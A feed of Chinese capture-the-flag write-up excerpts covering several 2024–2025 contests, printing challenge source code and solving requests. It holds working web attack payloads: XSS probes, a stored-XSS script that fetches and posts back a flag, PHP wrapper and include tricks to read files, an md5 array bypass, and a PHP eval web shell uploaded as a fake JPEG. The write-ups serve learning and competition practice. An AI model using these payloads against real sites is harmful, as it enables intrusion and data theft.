item.title: BYUCTF2025
item.content:encoded: Anaken21sec1 from math import ceil cipher = &amp;#34;cnpiaytjyzggnnnktjzcvuzjexxkvnrlfzectovhfswyphjt&amp;#34; key = &amp;#34;orygwktcjpb&amp;#34; # 1. 生成 keyNums 序列 …

item.title: 极客大挑战2024
item.description: 隔壁三叶草新生赛都这么难嘛
item.content:encoded: 0x02 question problem_on_my_web 表白墙？先F12看看有没有什么http头的限制，没看到有，那测试，发现弹窗了 &amp;lt;script&amp;gt;alert(1)&amp;lt;/script&amp;gt; If you could tell me where my website has …

item.title: SHCTF2024
item.content:encoded: 0x01 前言 这个比赛结束了，但是听说赛题质量挺高的来看看 0x02 question [Week1] 1zflask 访问robots.txt，拿到路由/s3recttt import os import flask from flask import Flask, request, …

item.title: 网鼎杯2024青龙组
item.description: 0x01 感觉感觉不出来什么感觉 0x02 签到 直接交flag web02 首先F12看到是Werkzeug/3.0.3 Python/3.8.19 然后就会往ssti去靠了，随便登录之后发现没啥区别，会自动生成一个哈希，然后用payloadallthings进行fuzz，进行回显查看，发现还是不行 查看源代码发现是直接插入的 &lt;/div&gt; &lt;/form&gt; &lt;br&gt; &lt;br&gt; &lt;h3&gt;无人机 ToDo List&lt;/h3&gt; &lt;div&gt;1. 早上起飞监控&lt;/div&gt; &lt;br&gt; &lt;div&gt;2. 中午加班监控&lt;/div&gt; &lt;br&gt; &lt;div&gt;3. 晚上回收并进行复盘&lt;/div&gt; &lt;br&gt;2&lt;br&gt; &lt;/div&gt; &lt;script&gt;alert(1)&lt;/script&gt; 成功弹窗 然后有个/flag路由，这里我们是将路由给写到当前页面 POST /content/f2260ea5a2a5967f8e4a7e80322363c7 HTTP/1.1 Host: 0192d5e248dc7e5b87ec4d98a1a66d68.8fwa.dg09.ciihw.cn:46739 Content-Length: 273 Cache-Control: max-age=0 Origin: http://0192d5e248dc7e5b87ec4d98a1a66d68.8fwa.dg09.ciihw.cn:46739 Content-Type: application/x-www-form-urlencoded Upgrade-Insecure-Requests: 1 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7 Referer: http://0192d5e248dc7e5b87ec4d98a1a66d68.8fwa.dg09.ciihw.cn:46739/content/f2260ea5a2a5967f8e4a7e80322363c7 Accept-Encoding: gzip, deflate Accept-Language: zh-CN,zh;q=0.9,en;q=0.8 Connection: close content=&lt;script&gt; fetch(&#39;/flag&#39;).then(response =&gt; response.text()).then(data =&gt; { fetch(&#39;/content/f2260ea5a2a5967f8e4a7e80322363c7&#39;,{ method:&#39;POST&#39;, headers:{&#39;Content-Type&#39;:&#39;application/x-www-form-urlencoded&#39;}, body:&#34;content=1&#34;%2bdata }) }) &lt;/script&gt; 然后提交任务就可以了
item.content:encoded: 0x01 感觉感觉不出来什么感觉 0x02 签到 直接交flag web02 首先F12看到是Werkzeug/3.0.3 Python/3.8.19 然后就会往ssti去靠了，随便登录之后发现没啥区别，会自动生成一个哈希，然后用payloadallthings进行fuzz，进行回显查看，发现还是不 …

item.title: SCTF2024
item.description: 0x01 前言 又是变成劳大的一个周末 0x02 question ezrender 这里进入之后是一个登录框，本来是黑盒的，但是后面给了代码和提示 ulimit -n =2048 先把代码放出来吧 app.py from flask import Flask, render_template, request, render_template_string,redirect from verify import * from User import User import base64 from waf import waf app = Flask(__name__,static_folder=&#34;static&#34;,template_folder=&#34;templates&#34;) user={} @app.route(&#39;/register&#39;, methods=[&#34;POST&#34;,&#34;GET&#34;]) def register(): method=request.method if method==&#34;GET&#34;: return render_template(&#34;register.html&#34;) if method==&#34;POST&#34;: data = request.get_json() name = data[&#34;username&#34;] pwd = data[&#34;password&#34;] if name != None and pwd != None: if data[&#34;username&#34;] in user: return &#34;This name had been registered&#34; else: user[name] = User(name, pwd) return &#34;OK&#34; @app.route(&#39;/login&#39;, methods=[&#34;POST&#34;,&#34;GET&#34;]) def login(): method=request.method if method==&#34;GET&#34;: return render_template(&#34;login.html&#34;) if method==&#34;POST&#34;: data = request.get_json() name = data[&#34;username&#34;] pwd = data[&#34;password&#34;] if name != None and pwd != None: if name not in user: return &#34;This account is not exist&#34; else: if user[name].pwd == pwd: token=generateToken(user[name]) return &#34;OK&#34;,200,{&#34;Set-Cookie&#34;:&#34;Token=&#34;+token} else: return &#34;Wrong password&#34; @app.route(&#39;/admin&#39;, methods=[&#34;POST&#34;,&#34;GET&#34;]) def admin(): try: token = request.headers.get(&#34;Cookie&#34;)[6:] except: return &#34;Please login first&#34; else: infor = json.loads(base64.b64decode(token)) name = infor[&#34;name&#34;] token = infor[&#34;secret&#34;] result = check(user[name], token) method=request.method if method==&#34;GET&#34;: return render_template(&#34;admin.html&#34;,name=name) if method==&#34;POST&#34;: template = request.form.get(&#34;code&#34;) if result != &#34;True&#34;: return result, 401 #just only blackList if waf(template): return &#34;Hacker Found&#34; result=render_template_string(template) print(result) if result !=None: return &#34;OK&#34; else: return &#34;error&#34; @app.route(&#39;/&#39;, methods=[&#34;GET&#34;]) def index(): return redirect(&#34;login&#34;) @app.route(&#39;/removeUser&#39;, methods=[&#34;POST&#34;]) def remove(): try: token = request.headers.get(&#34;Cookie&#34;)[6:] except: return &#34;Please login first&#34; else: infor = json.loads(base64.b64decode(token)) name = infor[&#34;name&#34;] token = infor[&#34;secret&#34;] result = check(user[name], token) if result != &#34;True&#34;: return result, 401 rmuser=request.form.get(&#34;username&#34;) user.pop(rmuser) return &#34;Successfully Removed:&#34;+rmuser if __name__ == &#39;__main__&#39;: # for the safe del __builtins__.__dict__[&#39;eval&#39;] app.run(debug=False, host=&#39;0.0.0.0&#39;, port=8080) User.py
item.content:encoded: 0x01 前言 又是变成劳大的一个周末 0x02 question ezrender 这里进入之后是一个登录框，本来是黑盒的，但是后面给了代码和提示 ulimit -n =2048 先把代码放出来吧 app.py from flask import Flask, render_template, …

item.title: BaseCTF
item.description: 0x01 前言 比赛都结束了，但是我还是写一下WP吧，学到了挺多东西的，只打了前两周，后面开学了自己还要学一些东西，所以就没打了，气人的是，上个月底成都太热了，我写了两周的WP，居然热关机电脑没存上，啊啊啊 0x02 WP [Week1] A Dark Room 查看源码 [Week1] Aura 酱的礼物 &lt;?php highlight_file(__FILE__); // Aura 酱，欢迎回家~ // 这里有一份礼物，请你签收一下哟~ $pen = $_POST[&#39;pen&#39;]; if (file_get_contents($pen) !== &#39;Aura&#39;) { die(&#39;这是 Aura 的礼物，你不是 Aura！&#39;); } // 礼物收到啦，接下来要去博客里面写下感想哦~ $challenge = $_POST[&#39;challenge&#39;]; if (strpos($challenge, &#39;http://jasmineaura.github.io&#39;) !== 0) { die(&#39;这不是 Aura 的博客！&#39;); } $blog_content = file_get_contents($challenge); if (strpos($blog_content, &#39;已经收到Kengwang的礼物啦&#39;) === false) { die(&#39;请去博客里面写下感想哦~&#39;); } // 嘿嘿，接下来要拆开礼物啦，悄悄告诉你，礼物在 flag.php 里面哦~ $gift = $_POST[&#39;gift&#39;]; include($gift); 这是 Aura 的礼物，你不是 Aura！ @重定向一下即可 pen=data://text/plain,Aura&amp;challenge=http://jasmineaura.github.io@challenge.basectf.fun:24028/&amp;gift=php://filter/convert.base64-encode/resource=flag.php [Week1] HTTP 是什么呀 Request: POST /?basectf=we1c%2500me HTTP/1.1 Host: challenge.basectf.fun:25643 Content-Length: 11 Pragma: no-cache Cache-Control: no-cache Upgrade-Insecure-Requests: 1 Origin: http://challenge.basectf.fun:25643 Content-Type: application/x-www-form-urlencoded User-Agent: Base Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7 Referer: Base Accept-Encoding: gzip, deflate Accept-Language: zh-CN,zh;q=0.9,en;q=0.8 x-forwarded-for: 127.0.0.1 cookie: c00k13=i can&#39;t eat it Connection: close Base=fl%40g [Week1] md5绕过欸 &lt;?php highlight_file(__FILE__); error_reporting(0); require &#39;flag.php&#39;; if (isset($_GET[&#39;name&#39;]) &amp;&amp; isset($_POST[&#39;password&#39;]) &amp;&amp; isset($_GET[&#39;name2&#39;]) &amp;&amp; isset($_POST[&#39;password2&#39;]) ){ $name = $_GET[&#39;name&#39;]; $name2 = $_GET[&#39;name2&#39;]; $password = $_POST[&#39;password&#39;]; $password2 = $_POST[&#39;password2&#39;]; if ($name != $password &amp;&amp; md5($name) == md5($password)){ if ($name2 !== $password2 &amp;&amp; md5($name2) === md5($password2)){ echo $flag; } else{ echo &#34;再看看啊，马上绕过嘞！&#34;; } } else { echo &#34;错啦错啦&#34;; } } else { echo &#39;没看到参数呐&#39;; } ?&gt; ?name[]=1&amp;name2[]=1 POST: password[]=2&amp;password2[]=2 [Week1] upload Request: POST / HTTP/1.1 Host: challenge.basectf.fun:31060 Content-Length: 204 Cache-Control: max-age=0 Upgrade-Insecure-Requests: 1 Origin: http://challenge.basectf.fun:31060 Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryZhDnBFvG8YCvvDXw User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7 Referer: http://challenge.basectf.fun:31060/ Accept-Encoding: gzip, deflate Accept-Language: zh-CN,zh;q=0.9,en;q=0.8 Connection: close ------WebKitFormBoundaryZhDnBFvG8YCvvDXw Content-Disposition: form-data; name=&#34;file&#34;; filename=&#34;shell.php&#34; Content-Type: image/jpeg &lt;?=eval($_POST[a]);?&gt; ------WebKitFormBoundaryZhDnBFvG8YCvvDXw-- 得到路径/uploads/4e5f4647-ae62-4dcf-ae77-0a4c23b449b9.jpg
item.content:encoded: 0x01 前言 比赛都结束了，但是我还是写一下WP吧，学到了挺多东西的，只打了前两周，后面开学了自己还要学一些东西，所以就没打了，气人的是，上个月底成都太热了，我写了两周的WP，居然热关机电脑没存上，啊啊啊 0x02 WP [Week1] A Dark Room 查看源码 [Week1] Aura …
